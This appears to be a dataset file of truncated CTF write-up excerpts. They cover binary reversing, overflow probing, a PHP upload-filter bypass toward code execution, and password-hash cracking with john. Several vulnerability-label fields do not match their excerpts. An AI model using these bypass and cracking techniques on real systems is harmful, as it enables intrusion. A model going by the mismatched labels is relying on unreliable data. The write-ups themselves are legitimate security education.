ctf_writeup,writeups-89,writeups,hackover-ctf-2015/pwn/easy-shell/sudhackar/README.md,sudhackar,buffer_overflow,"[](ctf=hackover-2015) [](type=pwn) [](tags=buffer-overflow,ROP) [](tools=pwntools,gdb-peda) [](techniques=ROP) # easy-shell (pwn-75) We have a [zip](../easy_shell-2fdf5e4dea11c1e96f0a81971b096e48.tgz) file. Unzipping it gives us ```bash $ file easy_shell easy_shell: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=db8c496a9a78e4d2b5088ef340c422f757888559, not stripped $ ./easy_shell .-""; ! ;""-. .'! : | : !`. /\ ! : ! : ! /\ /\ | ! :|: ! | /\ ( \ \ ; :!: ; / / ) ( `. \ | !:|:! | / .' ) (`. \ \ \!:|:!/ / / .') \ `.`.\ |!|! |/,'.' / `._`.\\\!!!// .'_.' `.`.\\|//.'.' |`._`n'_.'| ""----^----"">> nom nom, shell> AAAA ``` Easy shell should be easy. Lets start! Dump of assembler code for function main: ```objdump 0x080484d6 <+0>: lea ecx,[esp+0x4] 0x080484da <+4>: and esp,0xfffffff0 0x080484dd <+7>: push DWORD PTR [ecx-0x4] 0x080484e0 <+10>: push ebp 0x080484e1 <+11>: mov ebp,esp 0x080484e3 <+13>: push ecx => 0x080484e4 <+14>: sub esp,0x4 0x080484e7 <+17>: call 0x804847b <do_stuff> 0x080484ec <+22>: mov eax,0x2a 0x080484f1 <+27>: add esp,0x4 0x080484f4 <+30>: pop ecx 0x080484f5 <+31>: pop ebp 0x0"
ctf_writeup,writeups-90,writeups,hackover-ctf-2015/reverse/goto/sudhackar/README.md,sudhackar,command_injection,"[](ctf=hackover-2015) [](type=reverse) [](tags=reverse,recovery) [](tools=binwalk,gdb-peda) # goto (reverse-150) We have a [zip](../goto-03661d1a42ad20065ef6bfbe5a06287c.tgz) file. Unzipping it gives us a file goto.bin ```bash $ file goto.bin goto.bin: data ``` data is somewhat nasty for a 150 pt challenge. So I used binwalk on it. ```bash $ binwalk -e goto.bin DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 74 0x4A gzip compressed data, maximum compression, has original file name: ""rvs"", from Unix, last modified: Thu Oct 15 19:19:35 2015 $ file _goto.bin.extracted/rvs _goto.bin.extracted/rvs: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), for GNU/Linux 2.6.24, dynamically linked, interpreter \004, stripped ``` This could work. ```bash $ ./rvs PASSWORD:sudhackar ACCESS DENIED ``` I have observed it in many CTFs that how much has gdb-peda made the problems trivial to solve. So we quickly load it in gdb-peda and step through the program. ```bash gdb-peda$ b *0x400630 Breakpoint 1 at 0x400630 gdb-peda$ b *0x4006aa Breakpoint 2 at 0x4006aa ``` After some running and stepping. ```bash gdb-peda$ c Continuing. [-------"
ctf_writeup,writeups-91,writeups,hackover-ctf-2015/web/hack-the-planet/sudhackar/README.md,sudhackar,other,"[](ctf=hackover-2015) [](type=web) [](tags=headers) [](tools=burp-proxy) # hack-the-planet (web-50) ``` Hacking a site is basic task for any skilled hacker. Methods range from brute force to talking to people. No matter which method you choose, don't forget to use head. HINT: His question is the answer http://hack-the-planet.hackover.h4q.it ``` Partial code from [source](../hack-the-planet-275983b5101b4c089443f0486c6bfb03.go). ```go package main const ( flagPW = ""XXX"" flag = ""hackover15{XXX}"" ) func login(w http.ResponseWriter, r *http.Request) { switch r.Method { case ""HEAD"": hint(w, r) case ""POST"": check(w, r) default: gotoFail(w, r, ""/fail.jpg"", http.StatusMethodNotAllowed) } } func hint(w http.ResponseWriter, r *http.Request) { if r.Header.Get(""X-XXX"") == ""XXX"" { w.Header().Set(""X-XXX"", flagPW) w.WriteHeader(http.StatusAccepted) return } w.Header().Set(""X-XXX"", ""XXX"") w.WriteHeader(http.StatusPartialContent) } func check(w http.ResponseWriter, r *http.Request) { if err := r.ParseForm(); err != nil { gotoFail(w, r, ""fail.jpg"", 401) } if r.PostForm.Get(""pw"") != flagPW { gotoFail(w, r, ""fail.jpg"", 401) } w.WriteHeader(http.StatusAccepted) if _, err := w.Write([]byte(flag)); err !="
ctf_writeup,writeups-92,writeups,csaw-finals-2016/reverse/rev250/sudhackar/README.md,sudhackar,format_string,"[](ctf=csaw-finals-2016) [](type=reverse) [](tags=z3, constraint solving) [](tools=z3) [](techniques=constraint solving, symbolic execution) # packer (rev-250) We are given a [file](../packer-release) ```bash $file packer-release packer-release: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=30e7a8e386f33bb6bdf8a7701d7169584f9db7a9, stripped ``` Opening it in hopper gives a pretty neat decompilation. ```c main() { esi = arg1; if (arg0 == 0x2) { eax = malloc(0x1f); ebx = eax; *0x804a034 = eax; eax = *(esi + 0x4); strncpy(ebx, eax, 0x1f); *(int8_t *)(ebx + 0x1e) = 0x0; edx = *(ebx + 0xd); eax = *(ebx + 0x15); if (eax + edx == 0xe1d4e090) { *0x804a030 = *0x804a030 ^ 0xb93e4867; } if (eax + *(ebx + 0x19) == 0x94e860d0) { *0x804a030 = *0x804a030 ^ 0xb9f7a2ff; } esi = *(ebx + 0x9); if (esi + eax == 0xcdd6d8c1) { *0x804a030 = *0x804a030 ^ 0x7e3c14cd; } ecx = *(ebx + 0x11); if (ecx + *(ebx + 0x5) == 0x93e1a69f) { *0x804a030 = *0x804a030 ^ 0x21ddc691; } if (esi + edx == 0xcd929799) { *0x804a030 = *0x804a030 ^ 0x65aafd58; } if (eax + ecx == 0x9fa6cfd3) { *0x804a030 = *0x804a030 ^ 0x372f660e; } "
ctf_writeup,writeups-93,writeups,trend-micro-ctf-2017/analysis-offensive/300/sudhackar/README.md,sudhackar,command_injection,"[](ctf=trend-micro-ctf-2017) [](type=analysis,reverse) [](tags=android) [](tools=jd-gui,dex2jar) [](techniques=bruteforce) # analysis-offensive 300 *Disclaimer : This is not the smart way to do this, but its easy if you have an android development setup.* So we have an apk file. ```bash $ file TrendGacha.apk TrendGacha.apk: Zip archive data, at least v2.0 to extract $ unzip -qq TrendGacha.apk -d TrendGacha $ ls TrendGacha AndroidManifest.xml classes.dex lib META-INF res resources.arsc $ cd TrendGacha $ ~/tools/dex2jar/d2j-dex2jar.sh classes.dex dex2jar classes.dex -> ./classes-dex2jar.jar ``` I also installed the apk on a device to test it. ![Main](menu.png) The functions are quite simple. When you click on `GET GACHA!` it'll choose a character of the flag and give it to you. All your leaked chars can then be seen later in the `HISTORY`. Looking in the output of jd-gui on the jar. The code for `GET GACHA!`. ```java public void run() { Intent localIntent = new Intent(""com.tm.ctf.trendgacha.GET_GACHA""); if (a.N() == null) { a.b(a.this.i().getApplicationContext()); } a.N().sendBroadcast(localIntent); a.a(a.this, true); } ``` So the button sends a com.tm.ctf.trendgacha.GET_GACHA intent"
ctf_writeup,writeups-94,writeups,mma-ctf-2015/forensics/splitted/chaitan94/README.md,chaitan94,other,"[](ctf=mma-ctf-2015) [](type=forensics) [](tags=) [](tools=wireshark,gimp) [](techniques=) # Splitted (forensics-30) We're given [a pcap file](../splited.pcap), let's go ahead and open it in wireshark. We can easily see that a file called 'flag.zip' is being sent.. Let's filter required packets: > http && ip.src==192.168.4.10 We see 8 packets, so exported all the 8 packets as HTTP objects (File > Export Objects.. > HTTP). From wireshark we can the range of each HTTP response, as follows. Packet No | Range start ----------|------------ 16 | 2345 26 | 0 36 | 1407 46 | 2814 56 | 3283 66 | 469 76 | 938 86 | 1386 Sorted them according to range start Packet No | Range start ----------|------------ 26 | 0 66 | 469 76 | 938 86 | 1386 36 | 1407 16 | 2345 46 | 2814 56 | 3283 Renamed the exported packets to follow this order, and assembled them: ```bash $ mv packet-26 part-1.zip $ mv packet-66 part-2.zip $ mv packet-76 part-3.zip $ mv packet-86 part-4.zip $ mv packet-36 part-5.zip $ mv packet-16 part-6.zip $ mv packet-46 part-7.zip $ mv packet-56 part-8.zip $ cat part-*.zip > flag.zip $ unzip flag.zip ``` We see a file called 'flag.psd'. Opening it in GIMP, we see flag in the bottom layer ![S"
ctf_writeup,writeups-95,writeups,mma-ctf-2015/web/uploader/chaitan94/README.md,chaitan94,command_injection,"[](ctf=mma-ctf-2015) [](type=web) [](tags=php,lfi,rce) [](tools=) [](techniques=) # Uploader (web-100) Website says 'You can upload any file!', and really lets us. But when uploading text files, it removes any '<?' or 'php' as mentioned in the problem. Obviously, this question is based on LFI+Remote Code Execution, we need to get our php running there somehow. First I tried uploading various variations of php hello world, like: ```php <?php echo 'Hello world!'; ``` ```php <? echo 'Hello world!'; ``` ```shell #!/usr/bin/php -r echo 'Hello world!'; ``` Nothing seemed to work. Since '<?'s are being removed, I tried: ```php <<?? echo 'Hello world!'; ``` Still, no use. Is it possible to run without <? tags? After googling, we see from php manual page that, we can use these tags instead: ```php <script language=""php""> echo('Hello world!'); </script> ``` But after uploading, the word 'php' is removed, resulting in ```php <script language=""""> echo('Hello world!'); </script> ``` I was out of ideas. But after a long time, I realized that question only talks about removing 'php', but does it remove 'PHP' (uppercase) ? Let's find out: ```php <script language=""PHP""> echo('Hello world!'); </scri"
ctf_writeup,writeups-96,writeups,mma-ctf-2015/stego/nagoya-castle/chaitan94/README.md,chaitan94,other,"[](ctf=mma-ctf-2015) [](type=stego) [](tags=) [](tools=stegosolve) [](techniques=) # Nagoya Castle (stego-100) One image was given: ![Nagoya castle](../problem.png) It was simpler than I expected. Downloaded the image, opened it in [StegoSolve](http://www.caesum.com/handbook/Stegsolve.jar). ![Screenshot](screenshot.png) Aand there's our flag > MMA{raw_cr3am_pasta!}"
ctf_writeup,writeups-97,writeups,defcon-ctf-qualifier-2016/babys-first/baby-re/sudhackar/README.md,sudhackar,format_string,"[](ctf=defcon-qualifier-2015) [](type=reverse) [](tags=equation-solver) [](tools=angr) # baby-re (babys-first 1) ### ~~math required~~ We are given a file ```bash $ file baby-re baby-re: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5d5783d23d78bf70b80d658bccbce365f7448693, not stripped ``` Test-run ```bash $ ./baby-re Var[0]: 10 Var[1]: 10 Var[2]: 10 Var[3]: 101 Var[4]: 10 Var[5]: 10 Var[6]: 10 Var[7]: 10 Var[8]: 10 Var[9]: 10 Var[10]: 10 Var[11]: 10 Var[12]: 10 Wrong ``` So the problem looks simple, a simple keygen-me. Throw it to Hopper and ```c int main() { var_28 = *0x28; printf(""Var[0]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60); printf(0x402a14); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x4); printf(""Var[2]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x8); printf(""Var[3]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0xc); printf(""Var[4]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x10); printf(""Var[5]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x14); printf(""Var[6]: ""); fflush(rax); __isoc99_scanf(0x402a11, var_60 + 0x18); printf"
ctf_writeup,writeups-98,writeups,riceteacatpanda-2020/ai/meta-dreams/vn-ki/README.md,vn-ki,other,"# meta-dreams #### Category: AI #### Pts: 1750 We are give a pth file. Some initial investigations show that it might be a pytorch save file. Let's open it and see. It's getting opened correctly. Let's look at the keys ```python In [3]: checkpoint.keys() Out[3]: odict_keys(['conv1.conv2d.weight', 'conv1.conv2d.bias', 'in1.weight', 'in1.bias', 'conv2.conv2d.weight', 'conv2.conv2d.bias', 'in2.weight', 'in2.bias', 'conv3.conv2d.weight', 'conv3.conv2d.bias', 'in3.weight', 'in3.bias', 'res1.conv1.conv2d.weight', 'res1.conv1.conv2d.bias', 'res1.in1.weight', 'res1.in1.bias', 'res1.conv2.conv2d.weight', 'res1.conv2.conv2d.bias', 'res1.in2.weight', 'res1.in2.bias', 'res2.conv1.conv2d.weight', 'res2.conv1.conv2d.bias', 'res2.in1.weight', 'res2.in1.bias', 'res2.conv2.conv2d.weight', 'res2.conv2.conv2d.bias', 'res2.in2.weight', 'res2.in2.bias', 'res3.conv1.conv2d.weight', 'res3.conv1.conv2d.bias', 'res3.in1.weight', 'res3.in1.bias', 'res3.conv2.conv2d.weight', 'res3.conv2.conv2d.bias', 'res3.in2.weight', 'res3.in2.bias', 'res4.conv1.conv2d.weight', 'res4.conv1.conv2d.bias', 'res4.in1.weight', 'res4.in1.bias', 'res4.conv2.conv2d.weight', 'res4.conv2.conv2d.bias', 'res4.in2.weight', 'res4.in2.bi"
ctf_writeup,writeups-99,writeups,riceteacatpanda-2020/rev/number-lock/vn-ki/README.md,vn-ki,command_injection,"# Number Lock #### Category: rev #### pts: 1100 I was stuck at this chall for a long time. The breakthough came when the admins updated the files. The only file that was updated was the analytics.js file. That's when I realized that I was looking at the wrong file. When we look at the analytics.js file, its full of its repeating characters. One thing that comes to the mind is jsfuck. JSFuck website says `write any js with 6 characters`. That seems to be the case here. But the twist is that JSFuck output is xored with 104, so we decode that. ```python f = open('./analback.js') for i in f.read(): print(chr(ord(i) ^ 104), end='') ``` We try to decode the modified js using JSFuck but we get invalid JS. But the original decoded version works correctly. Given the original works, it's safe to assume JSFuck is doing something wrong. We can see from the jsfuck decoded output that the file is calling eval. Lets do a trick, `eval = console.log` and execute the original decoded version. Yay, we get this. ``` function guess(){ [][(![]+[])[+[]]+(![]+[])[!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]][([]+[][(![]+[])[+[]]+(![]+[])[!![]+!![]]+(![]+[])[+!![]]+(!![]+[])[+[]]])[!![]+!![]+!![]]+(!![]+[][(!"
ctf_writeup,writeups-100,writeups,riceteacatpanda-2020/rev/ghost-in-the-system/vn-ki/README.md,vn-ki,other,"# Ghost in the system #### Category: rev #### Points: 1500 We get a binary `ls` which does what ls does. Open the binary in ghidra and search for `rtcp`, the flag format. We see there's a string and it is referenced in the main function of the binary. Go to the reference and scroll a bit down and we see the following code. ```c if (bVar4) { allocator(); /* try { // try from 00101296 to 0010129a has its CatchHandler @ 00101fcc */ basic_string((char *)&otxt, (allocator *) ""s}yvzezqr_6x45jx2yp4d38qq1mvnsl0u7w32lr12gi}t3i5kw0oewkqb_vv6726}}95cmfy_jfgyx25n1e9cuyvsor_0mijcnhoa2kpvdtjd9js2kstbe5}s6zgyil6qxtr}wbol}dzmg3t02466hu1gkpm2xv8u{ryn0s11uzu_426p8k4owb21f3buof6ok{cp9s2s88k3yhzdsq1d2u7n3}9ex}9sly0p0}lp5yxdi7m37_p82o54im1z7bw5u2tu9n2loybmr51jih8lxf7z6n62goh3_63cnnbfczhmsy4pe}ijluq9xbkk4d{c13s5hjkjldeww9z}78oyt1pog5qudz{6fkw_wgon99yc{7v4sakj6pddk5i1c_1g74e_xwivk7mmbm16it6zxfc1y6sdz{0zrmuvysbl}pmw8z6jb8ejmrqknxbu5w4sv542plnzs8_}znyq6b6x67ar0lsq04qu742uenp4ufoxz7ir8gzohi352}7{9hk{yu4_zbj7gmvl{c_24weh8rwxp_24dhp{giv9k}gz840uezqk9s}qxi{2u2lbbt4i}kq8gomrqewvrj65dgwaoitc99yh4jest6sccnz2wlgmap6f9k04lhanc3wmgpj6xawln_jce6c6vfttu{zws4odom7{h5hewr_{5}6fty4a14ar64q1vvg0s28zsik}nhpmw}j92s42k}zzxx0"
ctf_writeup,writeups-101,writeups,csaw-quals-2018/reverse/kvm/sudhackar/README.md,sudhackar,other,"[](ctf=csaw-finals-2018) [](type=reverse) [](tags=tree) [](tools=ida, r2) # kvm (rev-500) ``` Reversing kvm We found a mysterious program that none of our most talented hackers could even begin to figure out. Author: toshi Solves: 58 ``` We are given a [file](../chall-500-kvm.elf) This sets up a vm and a vcpu using KVM apis. An area is mmaped between both machines loaded at 0x0 in guest. Then `_payload` from the binary is copied to this area and `rip` is set to 0. This means code for vm begins at `0x202174` and probably ends at `0x20348C` Code at `0x202174` is quite straight forward: ![0x202174](start_vm.png) First it reads 0x2800 bytes, then it calls `process_byte` on every byte. This call should return 1 otherwise it goes to ""Wrong"" message. Aftet this `memcmp` is called to match two memory regions at addresses `0x1320` and `0x580` which also decide Correct/Wrong message. #### process_byte This is where the challenge starts. First basic block comes to an abrupt `hlt` ![process_byte](process_byte.png) Looking at the function that starts the VM with KVM_RUN, there's a handler to handle IO and check when machine halts; ```c if ( ioctl(*(_DWORD *)a2, 0x8090AE81uLL, &v7) < 0 ) { perro"
ctf_writeup,writeups-102,writeups,csaw-quals-2016/pwn/tutorial/sudhackar/README.md,sudhackar,rop,[](ctf=csaw-quals-2016) [](type=exploit) [](tags=bof) [](tools=ROPtool) [](techniques=ROP) # tutorial (pwn-200) [Binary](../tutorial) [Solution](tutorial.py) > Leak canary by overwriting its NULL byte > ROP your way out (just dup2() STDIN to the socket) [![asciicast](https://asciinema.org/a/86029.png)](https://asciinema.org/a/86029)
ctf_writeup,writeups-103,writeups,ekoparty-pre-ctf-2015/pwn/login/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ekoparty-pre-ctf-2015) [](type=pwn) [](tags=buffer-overflow) We are given a [zip](../pwn50.zip) file. Extracting it gives us [flag](../flag) executable. ```bash $ file flag flag: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=36d90477a8214ae522b46125cf8296e52a3a2d6c, not stripped $ ./flag User : AAAA Password : AAAA ``` A quick strings on the file gives ```bash $ strings flag . . flag.txt User : Password : charly h4ckTH1s . . $ ./flag User : charly Password : h4ckTH1s Welcome guest! ``` But no flag!! ```objdump 0x00000000004008d3 <+310>: lea rax,[rbp-0xd0] 0x00000000004008da <+317>: add rax,0x4 0x00000000004008de <+321>: mov edx,0x6 0x00000000004008e3 <+326>: mov esi,0x400a23 0x00000000004008e8 <+331>: mov rdi,rax 0x00000000004008eb <+334>: call 0x400600 <strncmp@plt> 0x00000000004008f0 <+339>: test eax,eax 0x00000000004008f2 <+341>: jne 0x400945 <main+424> 0x00000000004008f4 <+343>: lea rax,[rbp-0xd0] 0x00000000004008fb <+350>: add rax,0x18 0x00000000004008ff <+354>: mov edx,0x8 0x0000000000400904 <+359>: mov esi,0x400a2a 0x0000000000400909 <+364>: mov rdi,rax 0x0000000000"
ctf_writeup,writeups-104,writeups,ekoparty-pre-ctf-2015/pwn/prng-service/chaitan94/README.md,chaitan94,other,"[](ctf=ekoparty-2015) [](type=pwn) [](tags=buffer-underflow) [](tools=) [](techniques=) # PRNG Service (pwn-25) We are a given [a file written in C](../pwn25.c). We see that the code first creates an array of length 128 called _rnd_. Then it pretends to generate random numbers, but all is does is sleep for 2 seconds and then generated random numbers using on a hard-coded seed (1337). In First part of the array, _ANSWER_ is copied. This must be the flag we are looking for. In second half of the array, generated random numbers are stored. Then the code asks for 10 numbers in the range [0-63] as input, and prints out the values stored at index 64+input of _rnd_. Only input validation done is to check whether given number is less that 64. So there is in fact no reason for us to care about the random numbers, since nothing is stopping us from entering negative numbers and accessing elements from the first half. So it's straightforward to get the answer - enter negative indices as inputs. Wrote down a [quick script](pwn.py) to automate this. Ran the code, Aand there's the flag > EKO{little_endian_and_signed_-1nt}"
ctf_writeup,writeups-105,writeups,ekoparty-pre-ctf-2015/pwn/smashing-the-stack-for-fun-and-profit/sudhackar/README.md,sudhackar,command_injection,"[](ctf=ekoparty-pre-ctf-2015) [](type=pwn) [](tags=buffer-overflow) Again we are given a [zip](../pwn100.zip) Extracting it gives us [xpl](../xpl) executable. ```bash $ file xpl xpl: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.24, BuildID[sha1]=1856a84cc2663caa91e1511a2f0691652201fb95, not stripped ./xpl Interesting data loaded at 0x7fff3a9971a0 Your username? aa ``` Doing a checksec shows us ```bash gdb-peda$ checksec CANARY : ENABLED FORTIFY : disabled NX : ENABLED PIE : disabled RELRO : Partial ``` Strange! NX enabled, we can't execute a shell code. Lets debug the binary. We create a fake flag.txt and run it. Interesting data loaded at 0x7fff3a9971a0 When we inspect the address we see that it contains the contents of flag.txt i.e our fake flag. Also when we give a long string as username, it crashes. ```bash $ ./xpl Interesting data loaded at 0x7fffab63c4c0 Your username? AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA *** stack smashing detected ***: ./xpl terminated Aborted ``` [This](http://seclists.org/bugtraq/2010/Apr/243) bugtraq post "
ctf_writeup,writeups-106,writeups,ekoparty-pre-ctf-2015/rev/ekogift/sudhackar/README.md,sudhackar,format_string,"[](ctf=ekoparty-2015) [](type=reverse) [](tags=) [](tools=retdec) [](techniques=decompilation) So we have [zip](../reversing25.zip) On extracting it we get a single file. ```sh $ file GIFT.exe GIFT.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows ``` PE32! we give it to [retdec](https://retdec.com/decompilation/) for decompilation. And we get [GIFT.c](../GIFT.c). Going through the code we see something. ```c if (*v3 == 69) { // 0x401c2d if (*(char *)(g6 + 1) == 75) { // 0x401c33 if (*(char *)(g6 + 2) == 79) { // 0x401c39 if (*(char *)(g6 + 3) == 123) { // 0x401c3f if (*(char *)(g6 + 4) == 116) { // 0x401c45 if (*(char *)(g6 + 5) == 104) { // 0x401c4b if (*(char *)(g6 + 6) == 105) { // 0x401c51 if (*(char *)(g6 + 7) == 115) { // 0x401c57 if (*(char *)(g6 + 8) == 95) { // 0x401c5d if (*(char *)(g6 + 9) == 105) { // 0x401c63 if (*(char *)(g6 + 10) == 115) { // 0x401c69 if (*(char *)(g6 + 11) == 95) { // 0x401c6f if (*(char *)(g6 + 12) == 97) { // 0x401c75 if (*(char *)(g6 + 13) == 95) { // 0x401c7b if (*(char *)(g6 + 14) == 103) { // 0x401c81 if (*(char *)(g6 + 15) == 105) { // 0x401c87 if (*(char *)(g6 + 16) == 102) { // 0x401c8d if (*(char *)(g6 "
ctf_writeup,writeups-107,writeups,ekoparty-pre-ctf-2015/crypto/rsa-2070/chaitan94/README.md,chaitan94,other,"[](ctf=ekoparty-2015) [](type=crypto) [](tags=rsa) [](tools=factordb,rsatool,openssl,pycrypto) [](techniques=rsa) # RSA-2070 (crypto-100) We have a [public key](../public.key), let's get the modulus (n) and exponent (e) ```bash $ openssl rsa -pubin -inform PEM -text -noout < public.key Public-Key: (2070 bit) Modulus: 25:b1:8b:f5:f3:89:09:7d:17:23:78:66:bb:51:cf: f8:de:92:24:53:74:9e:bc:40:3b:09:95:c9:7c:0e: 38:6d:46:c1:61:ca:df:f7:7c:69:86:0d:ae:47:91: c2:14:cf:84:87:aa:aa:9f:26:e9:20:a9:77:83:49: 06:03:8a:ef:b5:c3:08:27:df:cf:3f:c9:e9:76:95: 44:f9:4e:07:cd:fe:08:72:03:9a:3a:62:62:11:66: 78:b2:61:fb:2d:6b:9d:32:53:9e:92:a1:53:b3:67: 56:29:ba:b3:94:2e:7d:35:e3:0f:7e:ef:5a:bf:1c: 50:d7:97:d0:cc:88:e1:bd:cc:fd:1a:12:ea:6f:7e: f7:5c:37:27:db:df:2e:78:0f:34:28:ae:8f:7a:4f: b7:a8:9f:18:4a:36:50:32:b1:53:f8:42:5e:84:57: 50:eb:2b:7a:bc:02:dc:15:ce:02:07:50:7a:a9:50: 86:3b:b8:48:0a:78:02:8d:d6:29:79:94:4d:6c:63: 3f:af:a1:03:e4:db:28:ce:87:f5:a0:c6:ed:4a:2f: 26:64:42:7f:56:5c:77:81:ab:61:91:45:6d:97:1c: 7f:fa:39:52:72:37:4c:ec:01:55:e5:f9:11:89:db: 74:2e:4c:28:b0:3a:0f:a1:1c:ff:b0:31:73:d2:a4: cc:e6:ae:53 Exponent: 65537 (0x10001) ``` We have the modulus, let's check [factordb.com](http://fa"
ctf_writeup,writeups-108,writeups,ekoparty-pre-ctf-2015/crypto/classic-crypto/chaitan94/README.md,chaitan94,other,"[](ctf=ekoparty-2015) [](type=crypto) [](tags=morse,ceasar) [](tools=audacity) [](techniques=) # Classic Crypto (crypto-50) We are given an [audio file](../message.mp3). Let's open it up in [Audacity](http://audacityteam.org/) ![Screenshot of given audio file in Audacity](screenshot.png) Looks like morse code. Let's write it down: ``` .-. -..- -... --.. -... . ..-. .-. .--. -... --.- .-. .--. -. .-. ..-. -. . ``` Tried out an [online morse code decoder](http://morsecode.scphillips.com/translator.html) and got: ``` RXBZBEFRPBQRPNRFNE ``` Looks like we need to something more, maybe ceasar? Let's print out all 26 shifts: ``` lrvtvyzljvkljhlzhy mswuwzamkwlmkimaiz ntxvxabnlxmnljnbja ouywybcomynomkockb pvzxzcdpnzopnlpdlc qwayadeqoapqomqemd rxbzbefrpbqrpnrfne sycacfgsqcrsqosgof tzdbdghtrdstrpthpg uaecehiusetusquiqh vbfdfijvtfuvtrvjri wcgegjkwugvwuswksj xdhfhklxvhwxvtxltk yeigilmywixywuymul zfjhjmnzxjyzxvznvm agkiknoaykzaywaown bhljlopbzlabzxbpxo cimkmpqcambcaycqyp djnlnqrdbncdbzdrzq ekomorsecodecaesar flpnpstfdpefdbftbs gmqoqtugeqfgecguct hnrpruvhfrghfdhvdu iosqsvwigshigeiwev jptrtwxjhtijhfjxfw kqusuxykiujkigkygx ``` Aand there's the flag > EKO{MORSECODECAESAR}"
ctf_writeup,writeups-109,writeups,ekoparty-pre-ctf-2015/misc/get-the-flag/chaitan94/README.md,chaitan94,other,"[](ctf=ekoparty-2015) [](type=misc) [](tags=scraping) [](tools=) [](techniques=) # Get the flag (misc-50) Problem description says: > GET all the flags! literally. > > Hints: Source code anyone? GET them all GET in capital suggests a HTTP GET request, so maybe we should download all the flags from the website? Worth the try, so I opened up [scoreboard](https://ctf.ekoparty.org/prectf-scoreboard) and ran the following javascript in the console: ```javascript var flags = []; var imgs = $(""table img""); for (var i=0; i<imgs.size(); ++i) { var url = imgs[i].src; var country = url.split('/')[6].split(""."")[0]; if (flags.indexOf(country) == -1) flags.push(country); } console.log(flags.join("","")); ``` This gives out all the codes of countries, might not be necessarily exhaustive, but good enough data for now. > ""RUS,MNG,UKR,VNM,INT,GBR,USA,TWN,FRA,ARG,COL,ESP,HUN,EUR,BRA,NLD,DEU,URY,IDN,KOR,IND,MEX,BHR,HKG,MKD,BHS,EGY,SMR,JPN,THA,MLT,IRN,CHN,AUS,ITA,AND,CHL,TUR,UZB,ALB,MDA,CAN,BOL,PER,BGR,SVK,AFG,ECU,JOR,ISL,AGO,MAR,DZA,FIN,AZE,CZE,CRI"" Now, we can use wget and download all the flags. ```bash $ for i in RUS MNG UKR VNM INT GBR USA TWN FRA ARG COL ESP HUN EUR BRA NLD DEU URY IDN KOR IND MEX "
ctf_writeup,writeups-110,writeups,ekoparty-pre-ctf-2015/misc/password-manager/chaitan94/README.md,chaitan94,other,"[](ctf=ekoparty-2015) [](type=misc) [](tags=pwsafe,john) [](tools=john) [](techniques=bruteforce-attack) # Password Manager (misc-100) We're given a [Password Safe V3 database](../mypasswords) and a hint: [a-zA-Z0-9]{0,4}. So, time to use [john](http://www.openwall.com/john/) and crack it open! Let's run [pwsafe2john](https://github.com/piyushcse29/john-the-ripper/blob/master/src/pwsafe2john.c) on it and get a hash first, so that john can crack the password from the produced hash. ```bash $ pwsafe2john mypasswords > hash.txt ``` We also had a hint, so instead of letting john brute-force all possibilities, let's generate a wordlist and then run john using it: ```python ALNUM = ""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"" c = 0 q = '' def rec(i, s): if i > 4: return global c, q c += 1 q += ''.join(s + ['\n']) if c % 100000 == 0: with open(""wordlist"", ""a"") as f: f.write(q) q = '' for a in ALNUM: rec(i + 1, s + [a]) rec(0, []) ``` After running the above code, our wordlist will be generated (roughly 72 MB :P). Now, we just have to give this to john, and it is going to crack the password for us. ```bash $ john -w=wordlist hash.txt ``` Now let it run for a few minutes"
ctf_writeup,writeups-111,writeups,break-in-ctf-2016/forensics/find-the-idiot/f1recracker/README.md,f1recracker,other,"# Find The idiot (Score 100) #### Forensics, Pwning #### Question: Your friend Bob, is an expert penetration tester. He loves solving and creating puzzles. He is invited by Pied Diaper Inc. for some testing. You join him for this technical expedition. At the site, you watch him work for a few minutes, when he exclaims, ""What an idiot!"". Then, he looks at you with a with a playful gaze. Then, handing out a flash drive to you he says, ""Find the idiotic user"". Link: [Here](find_the_idiot.zip) The problem gives us a unix file system image as a zip. The friend is an expert in ""Penetration Testing"" which suggests that the system is vulnerable. We start by looking at: /etc/passwd /etc/shadow We find 7 users and sha512crypt passwords. We then use a dictionary attack to bruteforce the ciphers for 7 users listed in the files above. Using a relatively large dictionary of frequent passwords we can easily crack 1 set of credentials : gohan:dragon1:16816:0:99999:7::: ![Cracked Users](screen1.png) The flag is the password : ""dragon1"""
